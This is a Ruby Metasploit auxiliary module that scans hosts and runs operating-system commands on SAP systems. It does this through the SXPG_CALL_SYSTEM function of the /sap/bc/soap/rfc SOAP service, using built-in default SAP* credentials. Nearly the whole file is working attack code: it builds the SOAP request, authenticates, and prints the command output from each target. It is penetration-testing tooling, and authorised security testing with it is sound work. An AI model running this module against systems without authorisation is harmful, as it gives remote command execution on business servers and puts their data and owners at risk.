##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution',
			'Description' => %q{
					This module makes use of the SXPG_CALL_SYSTEM Remote Function Call, through the
				use of the /sap/bc/soap/rfc SOAP service to execute OS commands as configured in
				the SM69 transaction.
				},
			'References' =>
				[
					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
				],
			'Author' =>
				[
					'Agnivesh Sathasivam',
					'nmonkee'
				],
			'License' => MSF_LICENSE
		)
		register_options(
			[
				Opt::RPORT(8000),
				OptString.new('CLIENT', [true, 'SAP Client', '001']),
				OptString.new('USERNAME', [true, 'Username', 'SAP*']),
				OptString.new('PASSWORD', [true, 'Password', '06071992']),
				OptString.new('CMD', [true, 'SM69 command to be executed', 'PING']),
				OptString.new('PARAM', [false, 'Additional parameters for the SM69 command', nil]),
				OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
			], self.class)
	end

	def run_host(ip)
		os = datastore['OS']
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
		data << '<env:Body>'
		data << '<n1:SXPG_CALL_SYSTEM xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
		if datastore['PARAM']
			data << '<ADDITIONAL_PARAMETERS>' + datastore['PARAM'] + ' </ADDITIONAL_PARAMETERS>'
		else
			data << '<ADDITIONAL_PARAMETERS> </ADDITIONAL_PARAMETERS>'
		end
		data << '<COMMANDNAME>' + datastore['CMD'] + '</COMMANDNAME>'
		data << '<OPERATINGSYSTEM>' + os +'</OPERATINGSYSTEM>'
		data << '<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>'
		data << '</n1:SXPG_CALL_SYSTEM>'
		data << '</env:Body>'
		data << '</env:Envelope>'
		print_status("[SAP] #{ip}:#{rport} - sending SOAP SXPG_COMMAND_EXECUTE request")
		begin
			res = send_request_cgi({
				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
				'method' => 'POST',
				'data' => data,
				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
				'ctype' => 'text/xml; charset=UTF-8',
				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
				'headers' =>{
					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
					}
				})
			if res and res.code != 500 and res.code != 200
				# to do - implement error handlers for each status code, 404, 301, etc.
				print_error("[SAP] #{ip}:#{rport} - something went wrong!")
				return
			elsif res and res.body =~ /faultstring/
				error = res.body.scan(%r{<faultstring>(.*?)</faultstring>})
				0.upto(error.length-1) do |i|
					print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
				end
				return
			elsif res
				print_status("[SAP] #{ip}:#{rport} - got response")
				saptbl = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
						'Header' => "[SAP] SXPG_CALL_SYSTEM ",
						'Prefix' => "\n",
						'Postfix' => "\n",
						'Indent' => 1,
						'Columns' =>["Output",]
						)
				output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
				for i in 0..output.length-1
					saptbl << [output[i]]
				end
				print(saptbl.to_s)
			else
				print_error("[SAP] #{ip}:#{rport} - Unknown error")
				return
			end
		rescue ::Rex::ConnectionError
			print_error("[SAP] #{ip}:#{rport} - Unable to connect")
			return
		end

	end
end
